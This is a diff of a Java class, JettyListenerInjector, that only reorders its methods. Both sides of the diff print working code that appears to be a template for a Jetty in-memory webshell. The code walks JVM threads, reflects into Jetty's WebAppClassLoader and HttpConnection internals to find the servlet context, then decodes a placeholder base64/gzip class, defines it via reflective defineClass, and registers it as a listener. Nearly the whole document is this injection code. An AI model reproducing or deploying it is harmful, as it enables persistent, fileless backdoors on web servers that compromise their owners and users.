@@ -19,18 +19,9 @@ import java.util.zip.GZIPInputStream;
  */
 public class JettyListenerInjector {
 
-    public String getClassName() {
-        return "{{className}}";
-    }
-
-    public String getBase64String() throws IOException {
-        return "{{base64Str}}";
-    }
-
     static {
         new JettyListenerInjector();
     }
-
 
     public JettyListenerInjector() {
         try {
@@ -45,94 +36,6 @@ public class JettyListenerInjector {
 
     }
 
-    List<Object> getContext() {
-        List<Object> contexts = new ArrayList<Object>();
-        Thread[] threads = Thread.getAllStackTraces().keySet().toArray(new Thread[0]);
-        for (Thread thread : threads) {
-            try {
-                Object contextClassLoader = getContextClassLoader(thread);
-                if (isWebAppClassLoader(contextClassLoader)) {
-                    contexts.add(getContextFromWebAppClassLoader(contextClassLoader));
-                } else if (isHttpConnection(thread)) {
-                    contexts.add(getContextFromHttpConnection(thread));
-                }
-            } catch (Exception ignored) {
-            }
-        }
-        return contexts;
-    }
-
-    private Object getContextClassLoader(Thread thread) throws Exception {
-        return invokeMethod(thread, "getContextClassLoader");
-    }
-
-    private boolean isWebAppClassLoader(Object classLoader) {
-        return classLoader.getClass().getName().contains("WebAppClassLoader");
-    }
-
-    private Object getContextFromWebAppClassLoader(Object classLoader) throws Exception {
-        Object context = getFV(classLoader, "_context");
-        Object handler = getFV(context, "_servletHandler");
-        return getFV(handler, "_contextHandler");
-    }
-
-    private boolean isHttpConnection(Thread thread) throws Exception {
-        Object threadLocals = getFV(thread, "threadLocals");
-        Object table = getFV(threadLocals, "table");
-        for (int i = 0; i < Array.getLength(table); ++i) {
-            Object entry = Array.get(table, i);
-            if (entry != null) {
-                Object httpConnection = getFV(entry, "value");
-                if (httpConnection != null && httpConnection.getClass().getName().contains("HttpConnection")) {
-                    return true;
-                }
-            }
-        }
-        return false;
-    }
-
-    private Object getContextFromHttpConnection(Thread thread) throws Exception {
-        Object threadLocals = getFV(thread, "threadLocals");
-        Object table = getFV(threadLocals, "table");
-        for (int i = 0; i < Array.getLength(table); ++i) {
-            Object entry = Array.get(table, i);
-            if (entry != null) {
-                Object httpConnection = getFV(entry, "value");
-                if (httpConnection != null && httpConnection.getClass().getName().contains("HttpConnection")) {
-                    Object httpChannel = invokeMethod(httpConnection, "getHttpChannel");
-                    Object request = invokeMethod(httpChannel, "getRequest");
-                    Object session = invokeMethod(request, "getSession");
-                    Object servletContext = invokeMethod(session, "getServletContext");
-                    return getFV(servletContext, "this$0");
-                }
-            }
-        }
-        throw new Exception("HttpConnection not found");
-    }
-
-
-    private Object getListener(Object context) {
-        Object listener = null;
-        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-        if (classLoader == null) {
-            classLoader = context.getClass().getClassLoader();
-        }
-        try {
-            listener = classLoader.loadClass(getClassName()).newInstance();
-        } catch (Exception e) {
-            try {
-                byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
-                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
-                defineClass.setAccessible(true);
-                Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
-                listener = clazz.newInstance();
-            } catch (Throwable e1) {
-                e1.printStackTrace();
-            }
-        }
-        return listener;
-    }
-
     public static void addListener(Object context, Object listener) {
         try {
             if (isInjected(context, listener.getClass().getName())) {
@@ -143,7 +46,6 @@ public class JettyListenerInjector {
         } catch (Exception ignored) {
         }
     }
-
 
     public static boolean isInjected(Object context, String className) throws Exception {
 
@@ -160,7 +62,6 @@ public class JettyListenerInjector {
 
         return false;
     }
-
 
     static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
         try {
@@ -249,5 +150,100 @@ public class JettyListenerInjector {
                 throw new RuntimeException(e.getMessage());
             }
         }
+    }
+
+    public String getClassName() {
+        return "{{className}}";
+    }
+
+    public String getBase64String() throws IOException {
+        return "{{base64Str}}";
+    }
+
+    List<Object> getContext() {
+        List<Object> contexts = new ArrayList<Object>();
+        Thread[] threads = Thread.getAllStackTraces().keySet().toArray(new Thread[0]);
+        for (Thread thread : threads) {
+            try {
+                Object contextClassLoader = getContextClassLoader(thread);
+                if (isWebAppClassLoader(contextClassLoader)) {
+                    contexts.add(getContextFromWebAppClassLoader(contextClassLoader));
+                } else if (isHttpConnection(thread)) {
+                    contexts.add(getContextFromHttpConnection(thread));
+                }
+            } catch (Exception ignored) {
+            }
+        }
+        return contexts;
+    }
+
+    private Object getContextClassLoader(Thread thread) throws Exception {
+        return invokeMethod(thread, "getContextClassLoader");
+    }
+
+    private boolean isWebAppClassLoader(Object classLoader) {
+        return classLoader.getClass().getName().contains("WebAppClassLoader");
+    }
+
+    private Object getContextFromWebAppClassLoader(Object classLoader) throws Exception {
+        Object context = getFV(classLoader, "_context");
+        Object handler = getFV(context, "_servletHandler");
+        return getFV(handler, "_contextHandler");
+    }
+
+    private boolean isHttpConnection(Thread thread) throws Exception {
+        Object threadLocals = getFV(thread, "threadLocals");
+        Object table = getFV(threadLocals, "table");
+        for (int i = 0; i < Array.getLength(table); ++i) {
+            Object entry = Array.get(table, i);
+            if (entry != null) {
+                Object httpConnection = getFV(entry, "value");
+                if (httpConnection != null && httpConnection.getClass().getName().contains("HttpConnection")) {
+                    return true;
+                }
+            }
+        }
+        return false;
+    }
+
+    private Object getContextFromHttpConnection(Thread thread) throws Exception {
+        Object threadLocals = getFV(thread, "threadLocals");
+        Object table = getFV(threadLocals, "table");
+        for (int i = 0; i < Array.getLength(table); ++i) {
+            Object entry = Array.get(table, i);
+            if (entry != null) {
+                Object httpConnection = getFV(entry, "value");
+                if (httpConnection != null && httpConnection.getClass().getName().contains("HttpConnection")) {
+                    Object httpChannel = invokeMethod(httpConnection, "getHttpChannel");
+                    Object request = invokeMethod(httpChannel, "getRequest");
+                    Object session = invokeMethod(request, "getSession");
+                    Object servletContext = invokeMethod(session, "getServletContext");
+                    return getFV(servletContext, "this$0");
+                }
+            }
+        }
+        throw new Exception("HttpConnection not found");
+    }
+
+    private Object getListener(Object context) {
+        Object listener = null;
+        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
+        if (classLoader == null) {
+            classLoader = context.getClass().getClassLoader();
+        }
+        try {
+            listener = classLoader.loadClass(getClassName()).newInstance();
+        } catch (Exception e) {
+            try {
+                byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
+                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+                defineClass.setAccessible(true);
+                Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
+                listener = clazz.newInstance();
+            } catch (Throwable e1) {
+                e1.printStackTrace();
+            }
+        }
+        return listener;
     }
 }
